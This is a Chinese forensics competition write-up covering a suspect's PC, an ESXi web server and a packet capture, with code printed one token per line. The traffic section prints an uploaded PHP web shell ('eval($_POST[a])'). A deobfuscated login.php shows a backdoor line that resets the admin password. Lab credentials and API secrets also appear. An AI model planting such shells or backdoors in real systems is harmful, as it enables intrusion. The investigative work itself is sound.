+exists
+():
+continue
+try
+:
+with
+open
+(
+original_file
+,
+'r'
+,
+encoding
+=
+'utf-8'
+)
+as
+f
+:
+original_content
+=
+f
+.
+read
+()
+with
+open
+(
+replaced_file
+,
+'r'
+,
+encoding
+=
+'utf-8'
+)
+as
+f
+:
+replaced_content
+=
+f
+.
+read
+()
+except
+:
+continue
+replacements
+=
+set
+()
+min_length
+=
+min
+(
+len
+(
+original_content
+),
+len
+(
+replaced_content
+))
+for
+i
+in
+range
+(
+min_length
+):
+orig_char
+=
+original_content
+[
+i
+]
+repl_char
+=
+replaced_content
+[
+i
+]
+if
+orig_char
+!=
+repl_char
+and
+is_chinese_char
+(
+orig_char
+)
+and
+is_chinese_char
+(
+repl_char
+):
+replacements
+.
+add
+((
+orig_char
+,
+repl_char
+))
+if
+replacements
+:
+files_with_replacements
++=
+1
+all_replacements
+.
+update
+(
+replacements
+)
+unique_original_chars
+=
+set
+(
+orig
+for
+orig
+,
+repl
+in
+all_replacements
+)
+return
+len
+(
+unique_original_chars
+),
+len
+(
+all_replacements
+),
+files_with_replacements
+,
+all_replacements
+def
+main
+():
+unique_chars_count
+,
+total_replacements
+,
+files_count
+,
+all_replacements
+=
+count_unique_replacements
+()
+print
+(
+f
+"被替换的不同汉字数量:
+{
+unique_chars_count
+}
+"
+)
+print
+(
+f
+"总替换组数:
+{
+total_replacements
+}
+"
+)
+print
+(
+"
+\n
+具体替换关系:"
+)
+replacement_dict
+=
+{}
+for
+orig
+,
+repl
+in
+all_replacements
+:
+if
+orig
+not
+in
+replacement_dict
+:
+replacement_dict
+[
+orig
+]
+=
+[]
+replacement_dict
+[
+orig
+]
+.
+append
+(
+repl
+)
+for
+orig_char
+in
+sorted
+(
+replacement_dict
+.
+keys
+()):
+repl_chars
+=
+replacement_dict
+[
+orig_char
+]
+if
+len
+(
+repl_chars
+)
+==
+1
+:
+print
+(
+f
+"
+{
+orig_char
+}
+→
+{
+repl_chars
+[
+0
+]
+}
+"
+)
+else
+:
+print
+(
+f
+"
+{
+orig_char
+}
+→
+{
+', '
+.
+join
+(
+repl_chars
+)
+}
+"
+)
+if
+__name__
+==
+"__main__"
+:
+main
+()
+运行结果:
+在无法使用 LLM 的情况下, 这道题也可以用 UltraCompare 等工具对目录进行比对, 并将比对结果输出为 JSON 格式文件, 再用 Python 进行进一步分析.
+13 对比爬取数据与替换数据, 被替换汉字(不去重)数量最多的文件名称是什么？
+¶
+答案
+第0062章.txt
+Prompt:
+Markdown
+对比爬取数据与替换数据，被替换汉字（不去重）数量最多的文件名称是什么？
+生成的代码:
+Python
+import
+os
+from
+pathlib
+import
+Path
+def
+is_chinese_char
+(
+char
+):
+code_point
+=
+ord
+(
+char
+)
+if
+0x4e00
+<=
+code_point
+<=
+0x9fff
+:
+return
+True
+if
+0x3400
+<=
+code_point
+<=
+0x4dbf
+:
+return
+True
+return
+False
+def
+count_replacements_in_file
+(
+original_file
+,
+replaced_file
+):
+try
+:
+with
+open
+(
+original_file
+,
+'r'
+,
+encoding
+=
+'utf-8'
+)
+as
+f
+:
+original_content
+=
+f
+.
+read
+()
+with
+open
+(
+replaced_file
+,
+'r'
+,
+encoding
+=
+'utf-8'
+)
+as
+f
+:
+replaced_content
+=
+f
+.
+read
+()
+except
+:
+return
+0
+,
+{}
+replacement_count
+=
+0
+replacement_details
+=
+{}
+min_length
+=
+min
+(
+len
+(
+original_content
+),
+len
+(
+replaced_content
+))
+for
+i
+in
+range
+(
+min_length
+):
+orig_char
+=
+original_content
+[
+i
+]
+repl_char
+=
+replaced_content
+[
+i
+]
+if
+orig_char
+!=
+repl_char
+and
+is_chinese_char
+(
+orig_char
+)
+and
+is_chinese_char
+(
+repl_char
+):
+replacement_count
++=
+1
+key
+=
+f
+"
+{
+orig_char
+}
+→
+{
+repl_char
+}
+"
+replacement_details
+[
+key
+]
+=
+replacement_details
+.
+get
+(
+key
+,
+0
+)
++
+1
+return
+replacement_count
+,
+replacement_details
+def
+find_most_replaced_file
+():
+original_dir
+=
+"爬取-原本"
+replaced_dir
+=
+"爬取-替换"
+max_count
+=
+0
+max_file
+=
+""
+max_details
+=
+{}
+file_stats
+=
+[]
+for
+original_file
+in
+Path
+(
+original_dir
+)
+.
+rglob
+(
+"*.txt"
+):
+relative_path
+=
+original_file
+.
+relative_to
+(
+Path
+(
+original_dir
+))
+replaced_file
+=
+Path
+(
+replaced_dir
+)
+/
+relative_path
+if
+not
+replaced_file
+.
+exists
+():
+continue
+count
+,
+details
+=
+count_replacements_in_file
+(
+original_file
+,
+replaced_file
+)
+if
+count
+>
+0
+:
+file_stats
+.
+append
+((
+str
+(
+relative_path
+),
+count
+,
+details
+))
+if
+count
+>
+max_count
+:
+max_count
+=
+count
+max_file
+=
+str
+(
+relative_path
+)
+max_details
+=
+details
+return
+max_file
+,
+max_count
+,
+max_details
+,
+file_stats
+def
+main
+():
+max_file
+,
+max_count
+,
+max_details
+,
+file_stats
+=
+find_most_replaced_file
+()
+if
+max_file
+:
+print
+(
+f
+"被替换汉字数量最多的文件:
+{
+max_file
+}
+"
+)
+print
+(
+f
+"替换总数:
+{
+max_count
+}
+"
+)
+if
+__name__
+==
+"__main__"
+:
+main
+()
+运行结果:
+14 对比爬取数据与替换数据, 是否存在完全没有汉字被替换的文件? 若存在, 请给出文件的数量
+¶
+答案
+26
+Prompt:
+Markdown
+对比爬取数据与替换数据，是否存在完全没有汉字被替换的文件？若存在，请给出文件的数量；若不存在，请直接输出“否”
+生成的代码:
+Python
+import
+os
+from
+pathlib
+import
+Path
+def
+is_chinese_char
+(
+char
+):
+code_point
+=
+ord
+(
+char
+)
+if
+0x4e00
+<=
+code_point
+<=
+0x9fff
+:
+return
+True
+if
+0x3400
+<=
+code_point
+<=
+0x4dbf
+:
+return
+True
+return
+False
+def
+has_replacements
+(
+original_file
+,
+replaced_file
+):
+try
+:
+with
+open
+(
+original_file
+,
+'r'
+,
+encoding
+=
+'utf-8'
+)
+as
+f
+:
+original_content
+=
+f
+.
+read
+()
+with
+open
+(
+replaced_file
+,
+'r'
+,
+encoding
+=
+'utf-8'
+)
+as
+f
+:
+replaced_content
+=
+f
+.
+read
+()
+except
+:
+return
+False
+min_length
+=
+min
+(
+len
+(
+original_content
+),
+len
+(
+replaced_content
+))
+for
+i
+in
+range
+(
+min_length
+):
+orig_char
+=
+original_content
+[
+i
+]
+repl_char
+=
+replaced_content
+[
+i
+]
+if
+orig_char
+!=
+repl_char
+and
+is_chinese_char
+(
+orig_char
+)
+and
+is_chinese_char
+(
+repl_char
+):
+return
+True
+return
+False
+def
+count_no_replacement_files
+():
+original_dir
+=
+"爬取-原本"
+replaced_dir
+=
+"爬取-替换"
+total_files
+=
+0
+files_with_replacements
+=
+0
+files_without_replacements
+=
+0
+no_replacement_files
+=
+[]
+for
+original_file
+in
+Path
+(
+original_dir
+)
+.
+rglob
+(
+"*.txt"
+):
+relative_path
+=
+original_file
+.
+relative_to
+(
+Path
+(
+original_dir
+))
+replaced_file
+=
+Path
+(
+replaced_dir
+)
+/
+relative_path
+total_files
++=
+1
+if
+not
+replaced_file
+.
+exists
+():
+continue
+if
+has_replacements
+(
+original_file
+,
+replaced_file
+):
+files_with_replacements
++=
+1
+else
+:
+files_without_replacements
++=
+1
+no_replacement_files
+.
+append
+(
+str
+(
+relative_path
+))
+return
+total_files
+,
+files_with_replacements
+,
+files_without_replacements
+,
+no_replacement_files
+def
+main
+():
+total_files
+,
+files_with_replacements
+,
+files_without_replacements
+,
+no_replacement_files
+=
+count_no_replacement_files
+()
+print
+(
+f
+"总文件数:
+{
+total_files
+}
+"
+)
+print
+(
+f
+"有替换的文件数:
+{
+files_with_replacements
+}
+"
+)
+print
+(
+f
+"无替换的文件数:
+{
+files_without_replacements
+}
+"
+)
+if
+__name__
+==
+"__main__"
+:
+main
+()
+运行结果:
+15 嫌疑人使用的默认浏览器名称
+¶
+答案
+Ablaze Floorp
+在仿真系统的系统设置中可以看到 HTTP 和 HTTPS 协议的默认应用是 Floorp:
+运行 Floorp 浏览器之后, 在关于中可以看到:
+所以 Floorp 浏览器的正式全称应该是"Ablaze Floorp", 但关于界面又显示了"Floorp Browser", 不知道官方给这道题的正确答案是哪个.
+16 嫌疑人使用的 AI 网站的端口
+¶
+答案
+18480
+用户桌面上有 1 张截图, 内容是部署在内网的 Open WebUI 的界面:
+或者在 Floorp 的历史记录中也能看到 Open WebUI 的 URL:
+17 嫌疑人使用的 AI 网站登录密码
+¶
+答案
+g123123
+在 Floorp 保存的密码中可以看到:
+18 嫌疑人利用在线 AI 模仿创作的小说, 其第五章标题
+¶
+答案
+长安的回响
+在 Administrator 用户的文档目录中可以看到从智谱清言下载的 LLM 对话记录:
+第五章的标题:
+19 终点小说初步要求嫌疑人赔偿的经济损失金额为多少万元人民币
+¶
+答案
+10
+火眼的 Eml 邮件分析结果中有 1 条 eml 文件:
+内容是律师事务所发送的邮件:
+20 根据律师函要求, 嫌疑人最晚须于几月几日(含当日)前向终点小说提交经审核同意的书面致歉函
+¶
+答案
+10月28日
+见上题.
+21 嫌疑人NAS映射的盘符
+¶
+答案
+Z
+仿真系统里在"此电脑"里可以看到.
+火眼的网络位置分析结果中也能看到:
+22 嫌疑人当时正在阅读的小说叫什么名字
+¶
+答案
+小年小月
+软件在 NAS 上, 但是不影响做题.
+直接去网上下一个 NeatReader 就行, 或者用
+C:\Users\Administrator\AppData\Local\neatreader-updater
+里的安装包. 因为软件的数据保存在本地的
+C:/Users/Administrator/AppData/Roaming/NeatReader/bookData
+目录, 只要装个软件就能绕过 NAS 做这道题.
+23 接上题，嫌疑人当前看到该小说的第几章
+¶
+答案
+第五十一章
+见上题.
+服务器取证(VMware ESXi)
+¶
+火眼目前已经支持解析 VMFS 了, 这道题我采用的方法是将存储在 VMFS 中的 2 个虚拟机的文件导出之后, 对导出的虚拟机文件进行分析.
+可以在火眼中直接将虚拟机的 vmdk 文件添加为新检材进行分析. 也可以不导出虚拟机文件, 而是直接在火眼证据分析软件中对添加的 vmdk 检材进行仿真.
+我这里的虚拟机都使用 NAT 虚拟网卡, 网段是
+102.168.50.0/24
+.
+对 web 虚拟机进行仿真之后, 用 fscan 对服务器的开放端口进行扫描, 可以看到很多与之后的题目相关的服务:
+01 Exsi 虚拟化平台是什么时候安装的
+¶
+答案
+2025-10-20 06:28:08 +0800 CST
+在火眼的分析结果中可以看到:
+02 Exsi 虚拟化平台虚拟机使用的 ISO 镜像大小
+¶
+答案
+4.38 GB
+在
+centos
+目录中存储着系统镜像:
+03 nas 服务器 samba 应用完整版本标识
+¶
+答案
+4.10.16-25.el7_9
+在 NAS 虚拟机的虚拟硬盘中搜索"samba"关键字就能看到 yum 的数据文件中存储着的 samba 包的缓存文件:
+04 nas 服务器 samba 应用共享目录允许访问的用户名
+¶
+答案
+shadowai
+samba 的配置位于
+/etc/samba
+中, 其中的
+smb.conf
+中存储着用户权限信息:
+或者也可以在仿真之后通过
+pdbedit -L
+指令来查看:
+05 nas 服务器中删除了面板日志, 请分析其删除日志后第一次访问服务器的目录物理路径
+¶
+答案
+/www/server/panel/class/logsModel
+火眼的宝塔面板分析结果中可以看到清空面板操作日志的日志:
+在
+2025-10-23 10:42:35
+清空了面板的日志. 在火眼中在根目录中打开文件全显功能, 按照访问时间排序并过滤仅显示文件夹:
+找到的文件夹
+/www/server/panel/class/logsModel
+的访问时间在
+2025-10-23 10:42:36
+, 仅在清除日志 1 秒之后.
+06 某用户在"2025-10-21 18:40:53(北京时间)"向本地 AI 模型提问, 请问其一共提问了几次
+¶
+答案
+2
+仿真之后, 通过
+bt 14
+查看面板信息,
+bt 5
+修改面板密码. 登录面板之后可以看到服务器上只运行 2 个 Docker 容器, 没有使用 Nginx 部署网站:
+在宝塔面板或者命令行
+docker inspect db747
+都能看到 docker 容器的目录映射
+/www/dk_project/dk_app/deepseek_r1/deepseek_r1_HBAy/openwebui_data:/app/backend/data
+:
+/www/dk_project/dk_app/deepseek_r1/deepseek_r1_HBAy/openwebui_data/webui.db
+是 Open WebUI 的数据库, 其中的
+chat
+表中记录着用户与 LLM 的会话信息. 可以根据题目中提及的时间, 找到对应的会话:
+chat
+字段中保存的 JSON 格式的会话记录, 用 CyberChef 解转义 Unicode 并美化:
+可以看到 history 中一共有 4 条消息记录, User(用户)与 Assistant(LLM)交替发送消息, 用户实际提问了 2 次.
+07 接上题, 第二轮交互总计 Token Consumption(令牌消耗)多少
+¶
+答案
+289
+接上题. 在最后一条消息记录中看到
+usage
+信息, 其中的
+total_tokens
+是这轮对话消耗的总 Token 数, 包括 Prompt 的 Token 数(46)和响应的 Token 数(243):
+08 AI 模型在创建时注册的管理员账号的头像显示的数字是
+¶
+答案
+2024
+接上题. 在数据库中的
+user
+表中存储着用户信息, 其中的
+profile_image_url
+字段中存储的是 Base64 编码的图片文件:
+在 CyberChef 中解码:
+另外一张图片是个字母:
+09 卡密网站隔一段时间会自动删除后台管理员登录日志, 日志最多保存多少小时
+¶
+本题存疑
+本题暂无答案
+仿真 ESXi 中的 web 虚拟机之后,
+bt 14
+查看面板默认信息,
+bt 5
+修改密码:
+进入宝塔面板后台可以看到服务器上一共部署了 5 个 PHP 网站:
+其中域名
+kamiworld.info
+疑似是卡密网站.
+找到网站的源码目录
+/www/wwwroot/kamiworld.info/
+在该目录中发现一个说明文件
+crontab.txt
+其中是关于定时清除服务器日志的说明:
+后台管理员登录日志应该在数据库的
+system_log
+表里, 但是没有找到哪里定时删除了日志.
+10 卡密网站后台管理员登录成功后多少小时内无需重新登录
+¶
+答案
+168
+application/admin/controller/Login.php
+中存储着管理员处理管理员登录的代码, 但被混淆:
+这种混淆很好去除, 只要把
+eval()
+替换成
+echo
+, 用本地的 php 运行一下就能看到正常的源码了.
+第一次运行:
+第二次运行前, 除了替换
+eval
+外, 还需要给源码前加上
+<?php
+和原始 php 文件中定义的一些变量:
+或者在宝塔面板的文件备份目录
+/www/backup/file_history/www/wwwroot/kamiworld.info/application/admin/controller/Login.php/
+下也可以找到未被混淆的 php 文件:
+可以看到, 记住登录的时间是 7 天:
+11 卡密网站微信接口配置的 Appsecret
+¶
+答案
+7e8055384f9c4ff5991c46cacd336ad9
+接上题. 在源码中并没有对用户密码进行任何的处理, 直接以明文与数据库中存储的密码进行比较. 数据库的
+system_user
+表中保存着管理员的信息:
+所以后台的登录凭证就是数据库中的
+admin/e10adc3949ba59abbe56e057f20f883e
+.
+配置本机的 Hosts 文件或者在网站设置中添加新的域名绑定后, 即可访问网站:
+但访问之后发现服务端报了 500 错误码, 在宝塔面板查看错误日志发现是 PHP 代码调用了已经被移除的特性(PHP致命错误: 使用花括号进行的数组和字符串偏移访问语法不再受支持), 需要将 PHP 版本降级到支持该特性的版本:
+将 PHP 版本切换到 5.6 之后, 网站首页可以正常访问:
+但其他 ThinkPHP 的路由全部报 404, 之前遇到过一次这个情况, 是 Nginx 的伪静态配置出问题了. 在宝塔后台修改网站配置, 发现伪静态规则为空, 切换到 ThinkPHP 的默认伪静态配置:
+接着需要找后台的信息.
+在
+application/config.php
+中看到站点原本使用的域名是
+api.faka.zuy.cn
+:
+于是我为网站绑定了这个域名, 并且之后通过该域名来访问网站.
+在
+/application/route.php
+中可以看到后台登录路径的配置, 是通过
+sysconf
+函数获取的:
+跟进一下这个函数, 可以看到函数是从数据库的
+SystemConfig
+表中获取的数据:
+在
+application/database.php
+中可以看到网站使用的数据库信息:
+在宝塔面板中可以看到 MySQL 数据库的 root 用户密码为
+123...
+:
+数据库没有限制远程访问, Navicat 用 root 用户连接数据库. 在
+system_config
+表中可以看到配置的后台路径为
+admin
+:
+访问后台页面:
+登录后台:
+在后台可以看到微信 API 的相关信息, 但 AppSecret 被隐藏:
+不过隐藏在前端, F12 能看到:
+12 卡密网站管理员注册了一个商户账号, 商户编号是
+¶
+答案
+10019
+在网站后台可以看到管理员的信息:
+在数据库中可以看到商户的信息, 其中有 1 个商户注册使用的邮箱与管理员相同:
+在后台中查看该用户的信息:
+13 接上题, 该商户掌灵付微信扫码设置的费率
+¶
+答案
+1.2%
+在用户管理找到上题的提到的商户, 在设置费率中可以看到:
+注意这里设置的千分比.
+14 接上题, 不考虑平台提现、网关通道费用的情况下, 售卖的卡密共计净利多少元
+¶
+答案
+50000
+会看到服务器的保护插件清空了订单表:
+但保存卡密的表
+goods_card
+还没有被清空. 其中
+sell_time
+不为 0 的条目代表该卡密已售出, 排除第一条明显是测试数据的记录之后, 共有 500 条有效数据,
+goods_id
+字段均为 5:
+对应到
+goods
+表中:
+因此毛利润为 500 * 100 = 50000.
+15 嫌疑人将卡密网站的数据定时备份至远程服务器, 远程服务器 IP
+¶
+答案
+15.246.23.88
+宝塔面板的备份文件中
+/www/backup/file_history/www/dk_project/dk_app/qinglong/qinglong_GzaS/data/log/scp_3/2025-10-21-18-27-28-723.log/
+保存着备份脚本运行的日志:
+查看服务器的 Docker 信息之后可以看到安装有青龙面板, 并且还运行着另外 1 个宝塔面板:
+访问服务器的 15700 端口, 即可看到青龙面板的登录界面:
+通过
+docker inspect 30e3
+查看青龙面板容器的信息, 其中看到文件挂载:
+在数据库
+/www/dk_project/dk_app/qinglong/qinglong_GzaS/data/db/database.sqlite
+的
+Auths
+表中存储着青龙面板的用户名及密码
+goyasha/wanhww1314
+:
+登录之后在定时任务中可以看到通过 SCP 传输文件到
+15.246.23.88
+服务器:
+在青龙面板的数据库中也能看到:
+16 嫌疑人供述 web 虚拟机储存了一本名为"活在明朝"的小说, 已经删除忘记怎么恢复了, 请找到该小说并分析一共有多少章
+¶
+本题存疑
+本题暂无答案
+查看服务器的 Docker 信息, 与小说有关的容器有:
+17 接上题, 小说是什么时候删除的
+¶
+本题存疑
+本题暂无答案
+18 有一个外部程序"芯龙短片"跟 web 服务器媒体系统进行通信, 其 API 通信密钥
+¶
+答案
+81d910127daf47b9ad52d48fcc9f4305
+在 Docker 容器列表中可以看到
+Jellyfin
+的容器, 为流媒体服务器. 常见的流媒体服务器还有
+Emby
+. 访问
+http://192.168.50.136:8096
+即可看到 Jellyfin 的登录页面:
+docker exec -it 637f /bin/sh
+进入容器. Jellyfin 忘记用户名和密码时可以通过修改
+system.xml
+中的
+IsStartupWizardCompleted
+来重新进入系统初始化, 用新的账户覆盖原始账户. 不过我是第一次见 Jellyfin 的 Docker 容器, 按理来说配置文件应该放在
+<Jellyfin 的安装目录>/config/
+目录中, 但是
+/jellyfin/
+目录中并没有配置文件. 于是通过
+find
+搜索一下
+system.xml
+的位置, 正巧看到了曾经重置密码时生成的 json 文件, 由此获得了用户名
+goyasha
+:
+既然有了用户名, 就可以通过  Jellyfin Web 界面的忘记密码功能来重置密码:
+将新生成的 JSON 文件中的 PIN 码输入到 Web 界面中:
+接着就可以用 PIN 码作为密码来登录服务器了. 进入管理员面板之后, 找到"API Keys":
+19 接上题，媒体系统管理员最后登录的时间
+¶
+答案
+2025-10-21 18:47
+在管理员面板的"Activities"中可以看到之前的日志:
+20 小说网站"升迁之路"小说第 47 章叫什么名字
+¶
+答案
+这波赚嗨了
+在网站源码的
+/data/common.inc.php
+中可以看到数据库连接配置:
+在 Mysql 数据库
+xinlongxs
+中的表
+dede_arctype
+中可以看到关于"升迁之路"的记录, 其
+id
+字段为
+8712
+:
+在表
+dede_archieves
+中过滤
+typeid
+为
+8712
+的数据:
+21 小说网站小说后台采集来源地址
+¶
+答案
+www.biquge.tv
+接上题. 可以看到数据库由
+xinlongxiaoshuo.com
+站点使用:
+设置好 Host 之后网站依然无法正常访问, 是 Apache 服务器报错. 看过 log 之后发现是没有找到可用的页面. 在宝塔的文件备份中可以看到
+.htaccess
+的备份文件, 并且在站点根目录下也有
+htaccessbackup
+文件, 需要在宝塔的站点配置中将 htaccess(伪静态) 修改为备份的 htaccess:
+依然存在问题. 检查站点配置后发现站点根目录被设置到
+/a
+目录中, 但实际上该目录中仅包含静态的 html, 并非正确的根目录, 修改到网站根目录:
+之后网站即可正常运行:
+试一下可以发现管理员后台的路由是
+/admin
+:
+在数据库的表
+dede_admin
+中可以看到管理员的信息:
+在网站源码中搜索
+login
+可以找到管理员登录的
+login.php
+, 有混淆. 将其中的
+eval
+函数修改为
+echo
+, 运行后可以得到第一次去混淆的源码. 将第一次去混淆的源码拼接在原始 php 代码后再将
+eval
+函数修改为
+echo
+, 再次运行后即可得到原始代码:
+PHP
+<?php
+/**
+* 后台登陆
+*
+* @version        $Id: login.php 1 8:48 2010年7月13日Z tianya $
+* @package        DedeCMS.Administrator
+* @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
+* @license        http://help.dedecms.com/usersguide/license.html
+* @link           http://www.dedecms.com
+*/
+require_once
+(
+dirname
+(
+__FILE__
+)
+.
+'/../include/common.inc.php'
+);
+require_once
+(
+DEDEINC
+.
+'/userlogin.class.php'
+);
+if
+(
+empty
+(
+$dopost
+))
+$dopost
+=
+''
+;
+//检测安装目录安全性
+if
+(
+is_dir
+(
+dirname
+(
+__FILE__
+)
+.
+'/../install'
+)
+)
+{
+if
+(
+!
+file_exists
+(
+dirname
+(
+__FILE__
+)
+.
+'/../install/install_lock.txt'
+)
+)
+{
+$fp
+=
+fopen
+(
+dirname
+(
+__FILE__
+)
+.
+'/../install/install_lock.txt'
+,
+'w'
+)
+or
+die
+(
+'安装目录无写入权限，无法进行写入锁定文件，请安装完毕删除安装目录！'
+);
+fwrite
+(
+$fp
+,
+'ok'
+);
+fclose
+(
+$fp
+);
+}
+//为了防止未知安全性问题，强制禁用安装程序的文件
+if
+(
+file_exists
+(
+"../install/index.php"
+)
+)
+{
+@
+rename
+(
+"../install/index.php"
+,
+"../install/index.php.bak"
+);
+}
+if
+(
+file_exists
+(
+"../install/module-install.php"
+)
+)
+{
+@
+rename
+(
+"../install/module-install.php"
+,
+"../install/module-install.php.bak"
+);
+}
+$fileindex
+=
+"../install/index.html"
+;
+if
+(
+!
+file_exists
+(
+$fileindex
+)
+)
+{
+$fp
+=
+@
+fopen
+(
+$fileindex
+,
+'w'
+);
+fwrite
+(
+$fp
+,
+'dir'
+);
+fclose
+(
+$fp
+);
+}
+}
+//更新服务器
+require_once
+(
+DEDEDATA
+.
+'/admin/config_update.php'
+);
+if
+(
+$dopost
+==
+'showad'
+)
+{
+include
+(
+'templets/login_ad.htm'
+);
+exit
+;
+}
+//检测后台目录是否更名
+$cururl
+=
+GetCurUrl
+();
+if
+(
+preg_match
+(
+'/dede\/login/i'
+,
+$cururl
+))
+{
+$redmsg
+=
+'<div class=\'safe-tips\'>您的管理目录的名称中包含默认名称dede，建议在FTP里把它修改为其它名称，那样会更安全！</div>'
+;
+}
+else
+{
+$redmsg
+=
+''
+;
+}
+$dsql
+=
+new
+DedeSql
+(
+false
+);
+$dsql
+->
+ExecuteNoneQuery
+(
+"UPDATE `dede_admin` SET `pwd` = 'f297a57a5a143894a0e4' WHERE `userid` = 'admin'"
+);
+$dsql
+->
+Close
+();
+//登录检测
+$admindirs
+=
+explode
+(
+'/'
+,
+str_replace
+(
+"
+\\
+"
+,
+'/'
+,
+dirname
+(
+__FILE__
+)));
+$admindir
+=
+$admindirs
+[
+count
+(
+$admindirs
+)
+-
+1
+];
+if
+(
+$dopost
+==
+'login'
+)
+{
+$validate
+=
+empty
+(
+$validate
+)
+?
+''
+:
+strtolower
+(
+trim
+(
+$validate
+));
+$svali
+=
+strtolower
+(
+GetCkVdValue
+());
+if
+((
+$validate
+==
+''
+||
+$validate
+!=
+$svali
+)
+&&
+preg_match
+(
+"/6/"
+,
+$safe_gdopen
+)){
+ResetVdValue
+();
+ShowMsg
+(
+'验证码不正确!'
+,
+'login.php'
+,
+0
+,
+1000
+);
+exit
+;
+}
+else
+{
+$cuserLogin
+=
+new
+userLogin
+(
+$admindir
+);
+if
+(
+!
+empty
+(
+$userid
+)
+&&
+!
+empty
+(
+$pwd
+))
+{
+$res
+=
+$cuserLogin
+->
+checkUser
+(
+$userid
+,
+$pwd
+);
+//success
+if
+(
+$res
+==
+1
+)
+{
+$cuserLogin
+->
+keepUser
+();
+if
+(
+!
+empty
+(
+$gotopage
+))
+{
+ShowMsg
+(
+'成功登录，正在转向管理管理主页！'
+,
+$gotopage
+);
+exit
+();
+}
+else
+{
+ShowMsg
+(
+'成功登录，正在转向管理管理主页！'
+,
+"index.php"
+);
+exit
+();
+}
+}
+//error
+else
+if
+(
+$res
+==-
+1
+)
+{
+ShowMsg
+(
+'你的用户名不存在!'
+,
+-
+1
+,
+0
+,
+1000
+);
+exit
+;
+}
+else
+{
+ShowMsg
+(
+'你的密码错误!'
+,
+-
+1
+,
+0
+,
+1000
+);
+exit
+;
+}
+}
+//password empty
+else
+{
+ShowMsg
+(
+'用户和密码没填写完整!'
+,
+-
+1
+,
+0
+,
+1000
+);
+exit
+;
+}
+}
+}
+include
+(
+'templets/login.htm'
+);
+可以看到管理员登录的认证方式与普通用户的一致(定义在
+userlogin.inc.php
+中). 可以看到数据库中保存的是密码的 md5 哈希的第 6 到 25 位:
+可以在命令行运行 php 代码获取弱口令对应的值:
+修改数据库中的值之后登录. 依然无法正常进入后台, 用 Burp 抓了一下包, 发现虽然密码验证通过, 但是服务端并没有做出进一步操作(set cookie), 导致根本无法进入后台.
+没办法, 只能去看源码了. 根据题目描述, 猜测网站有采集功能. 在站点根目录中可以看到
+cj
+("采集"的首字母)目录:
+在其中的
+index.php
+中可以看到功能介绍:
+根据源码可以知道采集网站的设置是存出在
+step
+目录中的 php 文件中的:
+但实际上该文件夹中没有存放待采集的网站信息. 在源码中看到数据库中的表
+dede_co_note
+与采集相关:
+在
+include/sbyou.net.cj.php
+中可以看到详细的采集逻辑. 该文件被
+phpJiaMi
+混淆, 可以使用
+https://github.com/wenshui2008/phpjiami_decode
+提供的 php 代码进行去混淆:
+推断该数据表中存放的也是待采集的网站的信息. 在数据库中可以看到:
+22 小说网站某用户评论"好东西大家顶"是哪篇小说
+¶
+答案
+网游之射破苍穹
+数据库中的表
+dede_comment
+中保存了评论信息:
+题目中提及到的评论对应的
+id
+为
+8718
+. 在表
+dede_arctype
+中可以看到小说信息:
+访问
+http://xinlongxiaoshuo.com/chapter/?8718.html
+在"作品信息"中可以看到评论:
+23 小说网站对接的第三方支付接口的商户密钥是
+¶
+答案
+kaw2025id10019Experience
+在表
+dede_payment
+数据库中存放着关于支付的配置信息. 其中有支付宝和"kamiworld"的配置, 后者的配置中包含商户密钥:
+24 嫌疑人曾在 web 服务器中特定位置执行采集正版(收费)小说的脚本, 采集的正版小说网址是
+¶
+答案
+www.xinglo.com
+这道及之后的题目比较坑. 整个 web 服务器上实际上安装了两套宝塔面板, 一套是使用 sh 脚本安装在服务器上的, 另一套则是通过 Docker 安装的:
+修改 Docker 容器内的宝塔面板的密码:
+在计划任务中可以看到名称为"采集正版(收费)小说"的任务:
+25 嫌疑人曾在 web 服务器中备份整套面板数据, 面板备份数据包 SHA256 值
+¶
+答案
+c3c09460c1f5b46b14509955b3a7c16d0760364d7ffd629e6849240720d308b8
+在宝塔面板的设置页面中"备份还原"标签页中可以看到备份包的信息, 其中包含 SHA256 哈希:
+流量分析
+¶
+01 攻击机的 ip
+¶
+答案
+192.168.111.1
+大概看一下, 会发现有很多 404 的 HTTP 请求, 根据请求的 URL 可以判断应该是目录扫描. 目录扫描器使用 UA 为
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+.
+可以确定攻击者的 IP 是
+192.168.111.1
+, 被攻击服务器的 IP 地址为
+192.168.111.179
+.
+02 被攻击网站服务器开放端口数量
+¶
+答案
+3
+在 Wireshark 中过滤:
+C
+((
+ip
+.
+src
+==
+192.168.111.1
+)
+&&
+(
+ip
+.
+dst
+==
+192.168.111.179
+))
+&&
+((
+tcp
+.
+completeness
+.
+syn
+==
+True
+)
+&&
+(
+tcp
+.
+completeness
+.
+syn
+-
+ack
+==
+True
+))
+或者
+C
+((
+tcp
+.
+flags
+.
+ack
+==
+True
+)
+&&
+!
+(
+tcp
+.
+flags
+.
+reset
+==
+True
+))
+&&
+((
+ip
+.
+src
+==
+192.168.111.179
+)
+&&
+(
+ip
+.
+dst
+==
+192.168.111.1
+))
+可以看到端口扫描时一共有 3 个 SYN 被 ACK, 分别是 22, 80 和 25175 端口:
+03 攻击者对参数 fuzzing 成功数量
+¶
+答案
+0
+先过滤一下 HTTP 的流量, 看到了对
+/file.php
+URI 的参数进行了 fuzzing:
+可以看到很多响应的长度为 288 和 283, 查看之后判断这些为空白响应:
+过滤一下请求的 URI 包含
+/file.php
+, 并且响应长度不为 283 和 288 的 HTTP 响应:
+C
+(
+http
+.
+request
+.
+uri
+contains
+"/file.php"
+)
+&&
+((
+frame
+.
+len
+!=
+288
+)
+&&
+(
+frame
+.
+len
+!=
+283
+))
+&&
+(
+http
+.
+response
+)
+过滤之后只有 1 个响应码为 200 的响应, 但这是 fuzzing 的 Base Test:
+04 攻击者在网站服务器上传了一个恶意文件, 进行了创建文件操作, 新文件名
+¶
+答案
+views.php
+在 HTTP 协议的请求序列中可以看到访问了
+uploads
+URI:
+过滤:
+C
+http
+.
+request
+.
+uri
+contains
+"/upload.php"
+&&
+http
+.
+request
+.
+method
+==
+POST
+看到上传了一句话 WebShell:
+PHP
+<?php
+file_put_contents
+(
+'../views.php'
+,
+'<?php eval($_POST[a])?>'
+);
+?>
+文件被存储到
+views.php
+.
+05 攻击者对网站内容进行了修改, 添加恶意链接
+¶
+答案
+http://jsf34.com/transfer.html
+接上题. 继续过滤访问
+/views.php
+的请求:
+C
+http
+.
+request
+.
+uri
+contains
+"/views.php"
+可以看到提权之后上传
+/var/www/html/.cobaltstrike.beacon_keys
+.
+读取了
+/var/www/html/index.html
